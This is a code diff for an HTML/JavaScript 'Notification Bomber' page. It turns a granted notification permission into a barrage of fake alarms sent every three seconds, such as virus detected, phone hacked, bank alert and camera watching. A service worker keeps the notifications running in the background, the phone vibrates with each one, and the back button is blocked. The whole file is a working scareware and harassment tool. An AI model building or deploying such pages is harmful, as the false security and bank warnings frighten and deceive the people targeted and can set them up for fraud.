@@ -1,64 +1,208 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🔔 Notification Bomber</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💣 Notification Bomber</title>
+    <link rel="manifest" href="manifest.json">
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             background: #000;
-            font-family: Arial;
+            font-family: 'Segoe UI', Arial;
             text-align: center;
-            padding: 50px;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
         }
-        button {
-            background: red;
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: #111;
+            border-radius: 30px;
+            padding: 30px;
+            border: 2px solid #ff3333;
+        }
+        h1 {
+            color: #ff3333;
+            font-size: 32px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        .counter {
+            color: white;
+            font-size: 80px;
+            margin: 30px;
+            font-weight: bold;
+            text-shadow: 0 0 20px red;
+        }
+        .btn {
+            background: linear-gradient(135deg, #ff3333, #ff0000);
             color: white;
             border: none;
             padding: 20px 40px;
             font-size: 24px;
-            border-radius: 10px;
+            border-radius: 50px;
             cursor: pointer;
             margin: 20px;
+            width: 100%;
+            box-shadow: 0 10px 30px rgba(255,0,0,0.3);
         }
-        .counter {
-            color: white;
-            font-size: 50px;
-            margin: 20px;
+        .btn:hover {
+            transform: scale(1.05);
+        }
+        .btn:active {
+            transform: scale(0.95);
+        }
+        .status {
+            color: #ff9999;
+            margin: 15px;
+            font-size: 14px;
+        }
+        .footer {
+            color: #666;
+            font-size: 11px;
+            margin-top: 30px;
         }
     </style>
 </head>
 <body>
-    <h1 style="color:red;">💣 NOTIFICATION BOMBER</h1>
-    <div class="counter" id="count">0</div>
-    <button onclick="startBomb()">💥 START BOMB</button>
+    <div class="container">
+        <h1>💣 NOTIFICATION</h1>
+        <div class="counter" id="count">0</div>
+        <button class="btn" onclick="startBomb()" id="startBtn">💥 START 😈</button>
+        <div class="status" id="status">Ready to bomb...</div>
+        <div class="footer">⚡ Har 3 second mein notification • Background mein bhi</div>
+    </div>
 
     <script>
         let bombInterval;
         let count = 0;
+        let swRegistration = null;
 
+        // Register Service Worker
+        async function registerSW() {
+            if ('serviceWorker' in navigator) {
+                try {
+                    swRegistration = await navigator.serviceWorker.register('sw.js');
+                    console.log('✅ Service Worker registered');
+                    return true;
+                } catch (e) {
+                    console.log('❌ SW registration failed:', e);
+                    return false;
+                }
+            }
+            return false;
+        }
+
+        // Start bombing
         async function startBomb() {
+            const startBtn = document.getElementById('startBtn');
+            const statusEl = document.getElementById('status');
+            
             try {
-                // Request permission
+                // 1. Register Service Worker first
+                await registerSW();
+                
+                // 2. Request Notification Permission
+                statusEl.textContent = '📢 Asking for permission...';
                 const perm = await Notification.requestPermission();
                 
-                if(perm === 'granted') {
-                    // Simple bomb - no animations, no extra intervals
-                    bombInterval = setInterval(() => {
-                        count++;
-                        document.getElementById('count').textContent = count;
-                        
-                        new Notification('⚠️ VIRUS DETECTED!', {
-                            body: 'Click to remove threat',
-                            requireInteraction: true
-                        });
-                        
-                    }, 3000); // Har 3 second
+                if (perm === 'granted') {
+                    statusEl.textContent = '✅ Permission granted! Starting bomb...';
+                    startBtn.disabled = true;
+                    
+                    // Test notification immediately
+                    showNotification({
+                        title: '💣 BOMBER ACTIVATED!',
+                        body: 'Preparing to send notifications...'
+                    });
+                    
+                    // Start bombing after 2 seconds
+                    setTimeout(() => {
+                        bombInterval = setInterval(() => {
+                            count++;
+                            document.getElementById('count').textContent = count;
+                            
+                            // Different scary messages
+                            const messages = [
+                                { title: '⚠️ VIRUS DETECTED!', body: '3 malware found!' },
+                                { title: '🔴 PHONE HACKED!', body: 'Your data is being stolen!' },
+                                { title: '💀 SYSTEM CRITICAL!', body: 'Formatting drive C:' },
+                                { title: '📱 BANK ALERT!', body: 'Unauthorized transaction!' },
+                                { title: '🕵️ CAMERA ACCESS!', body: 'Someone is watching you!' },
+                                { title: '🔊 MICROPHONE ACTIVE!', body: 'Recording audio...' },
+                                { title: '📍 LOCATION TRACKED!', body: 'Your position shared!' },
+                                { title: '📸 PHOTO UPLOADED!', body: 'Gallery being uploaded!' }
+                            ];
+                            
+                            const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+                            
+                            // Send notification through Service Worker (works in background)
+                            showNotification(randomMsg);
+                            
+                            // Update status
+                            statusEl.textContent = `💥 Bomb sent: ${count}`;
+                            
+                        }, 3000); // Har 3 second
+                    }, 2000);
+                    
                 } else {
-                    alert('❌ Notification permission denied!');
+                    statusEl.textContent = '❌ Permission denied! Cannot bomb.';
+                    alert('❌ Notification permission required!');
                 }
             } catch(e) {
-                alert('❌ Error: ' + e.message);
+                statusEl.textContent = '❌ Error: ' + e.message;
+                console.error(e);
             }
         }
+
+        // Show notification using Service Worker (background compatible)
+        async function showNotification(notif) {
+            try {
+                if (swRegistration) {
+                    // Show via Service Worker (works even if tab closed)
+                    await swRegistration.showNotification(notif.title, {
+                        body: notif.body,
+                        icon: 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'%23ff0000\'/%3E%3Ctext x=\'50\' y=\'70\' font-size=\'70\' text-anchor=\'middle\' fill=\'white\'%3E💀%3C/text%3E%3C/svg%3E',
+                        badge: 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'%23ff0000\'/%3E%3C/svg%3E',
+                        vibrate: [500, 200, 500, 200, 500],
+                        requireInteraction: true,
+                        tag: 'bomb-' + Date.now(),
+                        renotify: true
+                    });
+                } else {
+                    // Fallback to regular notification
+                    new Notification(notif.title, {
+                        body: notif.body,
+                        icon: 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'%23ff0000\'/%3E%3C/svg%3E',
+                        vibrate: [500, 200, 500],
+                        requireInteraction: true
+                    });
+                }
+                
+                // Vibrate phone
+                if ('vibrate' in navigator) {
+                    navigator.vibrate([500, 200, 500]);
+                }
+            } catch(e) {
+                console.log('Notification error:', e);
+            }
+        }
+
+        // Block back button
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', function() {
+            history.pushState(null, null, location.href);
+        });
     </script>
 </body>
 </html>
